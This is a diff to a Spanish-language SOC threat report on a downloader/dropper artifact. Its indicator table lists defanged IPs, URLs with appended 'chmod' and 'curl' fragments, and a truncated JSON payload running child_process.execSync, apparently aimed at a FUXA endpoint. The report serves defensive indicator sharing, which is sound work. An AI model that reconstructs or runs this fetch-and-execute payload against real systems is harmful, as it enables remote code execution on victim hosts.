@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with very long lines (896), with CRLF line terminators de 1.1 KiB. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `cumshotnews` en `hxxp://192.142.28.XXX/cumshotnews`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:23:38+00:00`
+- **Registrado:** `2026-08-09T20:23:38.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -47,13 +48,13 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.128.XXX | static_analysis |
-| ip | 192.142.28.XXX | static_analysis |
-| url | hxxp://190.179.128.XXX:1881/fuxa | strings |
 | url | hxxp://192.142.28.XXX/cumshotnews;chmod | strings |
 | url | hxxp://192.142.28.XXX/cumshotnews;curl | strings |
-| hash | 27913cdb1a8d6896167557c865c200b033fe481489bbecd8d2783a1094f93453 | static_analysis |
+| url | hxxp://190.179.128.XXX:1881/fuxa | strings |
+| ip | 190.179.128.XXX | static_analysis |
+| ip | 192.142.28.XXX | static_analysis |
 | command | {"params":{"script":{"code":"const cp = require(\"child_process\");try{const r=cp.execSync(\"cd /tmp\|\|cd /var/run\|\|cd /m | strings |
+| hash | 27913cdb1a8d6896167557c865c200b033fe481489bbecd8d2783a1094f93453 | static_analysis |
 
 ## 🔎 Triage
 
